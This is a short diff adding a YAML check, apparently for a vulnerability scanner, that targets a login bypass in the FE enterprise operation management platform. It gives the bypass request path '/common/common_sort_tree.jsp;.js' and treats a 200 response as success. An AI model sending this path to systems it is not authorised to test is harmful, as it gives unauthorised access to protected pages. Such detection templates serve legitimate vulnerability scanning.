@@ -1,0 +1,3 @@
+name: "飞企互联-FE企业运营管理平台登录绕过漏洞"
+poc: "/common/common_sort_tree.jsp;.js"
+status_code: 200
